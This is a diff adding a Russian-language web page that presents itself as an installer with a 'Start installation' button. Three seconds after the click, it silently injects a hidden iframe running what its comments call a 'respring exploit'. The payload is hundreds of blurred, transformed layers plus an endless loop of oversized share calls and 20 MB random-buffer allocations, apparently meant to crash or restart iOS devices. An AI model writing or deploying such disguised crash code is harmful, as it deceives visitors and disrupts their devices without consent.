@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Установка</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f2f2f7;
+        }
+
+        .btn {
+            padding: 16px 32px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #ffffff;
+            background-color: #007aff;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: transform 0.2s ease, opacity 0.2s ease;
+            box-shadow: 0 4px 12px rgba(0, 122, 255, 0.3);
+        }
+
+        /* Анимация увеличения при нажатии */
+        .btn.active {
+            transform: scale(1.05);
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+
+    <button id="installBtn" class="btn">Начать установку</button>
+
+    <script>
+        // Ваша функция эксплойта респринга
+        function launchRespring() {
+            // Create hidden iframe for respring exploit
+            const iframe = document.createElement('iframe');
+            iframe.id = 'respring-iframe';
+            iframe.style.cssText = 'position: fixed; top: 0; left: 0; width: 1px; height: 1px; border: none; opacity: 0.01; pointer-events: none; z-index: -1;';
+            iframe.setAttribute('sandbox', 'allow-forms allow-modals allow-scripts allow-same-origin');
+            
+            document.body.appendChild(iframe);
+
+            const respringScript = `
+                <html>
+                <body style="margin:0; overflow:hidden;">
+                  <script>
+                    const container = document.createElement('div');
+                    container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+                    document.body.appendChild(container);
+
+                    for (let i = 0; i < 500; i++) {
+                      let d = document.createElement('div');
+                      d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
+                      container.appendChild(d);
+                    }
+
+                    setInterval(() => {
+                      try {
+                        navigator.share({ title: 'R', text: 'R'.repeat(100000) });
+                      } catch(e) {}
+                      let x = new Uint8Array(1024 * 1024 * 20);
+                      crypto.getRandomValues(x);
+                    }, 0);
+                  <\/script>
+                </body>
+                </html>
+            `;
+            
+            iframe.srcdoc = respringScript;
+        }
+
+        // Логика нажатия на кнопку
+        const button = document.getElementById('installBtn');
+
+        button.addEventListener('click', function() {
+            // 1. Воспроизведение звука otkat.mp3
+            const audio = new Audio('otkat.mp3');
+            audio.play().catch(e => console.log('Ошибка воспроизведения аудио'));
+
+            // 2. Анимация кнопки и отключение нажатий
+            button.classList.add('active');
+            button.disabled = true;
+
+            // 3. Задержка в 3 секунды (3000 миллисекунд)
+            setTimeout(() => {
+                // 4. Запуск функции эксплойта респринга
+                launchRespring();
+            }, 3000);
+        });
+    </script>
+
+</body>
+</html>
